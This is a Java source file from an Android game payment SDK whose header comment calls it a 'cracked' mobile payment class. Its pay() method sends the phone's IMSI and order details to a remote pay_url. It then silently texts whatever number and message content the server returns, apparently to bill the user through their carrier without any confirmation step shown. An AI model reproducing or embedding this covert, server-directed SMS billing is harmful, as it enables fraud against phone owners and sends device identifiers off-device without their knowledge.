package mobi.zty.pay.sdk.tianyiFee;

import java.io.IOException;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.Util_G;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ConnectTimeoutException;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreConnectionPNames;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONObject;

import cn.egame.terminal.paysdk.codec.MD5;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

/**
 * mm网络破解支付管理类
 * 
 * @author Administrator
 * 
 */
public class TianYiFeeInstance extends PaymentInterf {
	private static TianYiFeeInstance instance;
	private Handler callBHandler = null;

	public static TianYiFeeInstance getInstance() {
		if (instance == null) {
			instance = scyMMpay();
		}
		return instance;
	}

	private static synchronized TianYiFeeInstance scyMMpay() {
		if (instance == null) {
			instance = new TianYiFeeInstance();
		}
		return instance;
	}

	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
	}

	@Override
	public void pay(final Context context, Object... parameters) {

		final String seller_key = (String) parameters[0];
		final String fee = (String) parameters[1];
		final String imsi = (String) parameters[2];
		final String app_name = (String) parameters[3];
		final String out_trade_no = (String) parameters[4];
		final String pay_url = (String) parameters[5];
		final String secret = (String) parameters[6];
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					callBHandler.sendEmptyMessageDelayed(
							PayConfig.NATIVE_FEE_FAIL, 20000);
					String express = "app_name="
							+ URLEncoder.encode(app_name, "UTF-8") + "&fee="
							+ fee + "&imsi=" + imsi + "&out_trade_no="
							+ out_trade_no + "&seller_key=" + seller_key;
					String sign = Helper.md5(express + secret);
					// String url = pay_url+"?"+express+"&sign="+sign;
					Map<String, String> mapEnty = new HashMap<String, String>();
					mapEnty.put("app_name",
							URLEncoder.encode(app_name, "UTF-8"));
					mapEnty.put("fee", fee);
					mapEnty.put("imsi", imsi);
					mapEnty.put("out_trade_no", out_trade_no);
					mapEnty.put("seller_key", seller_key);
					mapEnty.put("sign", sign);
					String requestResponse = HttpRequestt.post(pay_url,
							mapEnty, true).body();
					// String requestResponse = reqTianYiPay(pay_url,postData);
					boolean isSendMsg = false;
					if (requestResponse != null && requestResponse != "") {
						JSONObject ret = new JSONObject(requestResponse);
						if (ret.getString("code").equals("1")) {// 订单获取成
							JSONArray jsonArray = new JSONArray(ret
									.getString("msg"));
							for (int i = 0; i < jsonArray.length(); i++) {
								JSONObject result = (JSONObject) jsonArray
										.get(i);
								String trade_NO = result
										.getString("out_trade_no");
								if (out_trade_no.equals(trade_NO)) {// 如果订单不对
																	// 不做处理
									String send_num = result
											.getString("sender_number");
									String sms_content = result
											.getString("message_content");
									callBHandler
											.removeMessages(PayConfig.NATIVE_FEE_FAIL);
									callBHandler.sendEmptyMessageDelayed(
											PayConfig.NATIVE_FEE_FAIL, 20000);
									Intent itSend = new Intent(
											GameSDK.SENT_SMS_ACTION);
									PendingIntent mSendPI = PendingIntent.getBroadcast(
											context.getApplicationContext(), 0,
											itSend, PendingIntent.FLAG_ONE_SHOT);// 这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。
									GameSDK.getInstance().bCallback = 0;
									Util_G.sendTextMessage(context, send_num,
											sms_content, mSendPI, 0);
									Util_G.debugE("dianxin_pay", "pay_data->"
											+ sms_content);
									isSendMsg = true;
								}
							}

						}
					}
					if (!isSendMsg) {
						PayResultInfo info = new PayResultInfo();
						info.resutCode = PayConfig.TC_FEE_FAIL;
						info.retMsg = "支付失败";
						Message message = callBHandler
								.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						return;
					}
				} catch (Exception e) {
					PayResultInfo info = new PayResultInfo();
					info.resutCode = PayConfig.TC_FEE_FAIL;
					info.retMsg = "支付失败";
					Message message = callBHandler
							.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
					message.obj = info;
					message.sendToTarget();
					e.printStackTrace();
				}
			}
		}).start();
	}

}
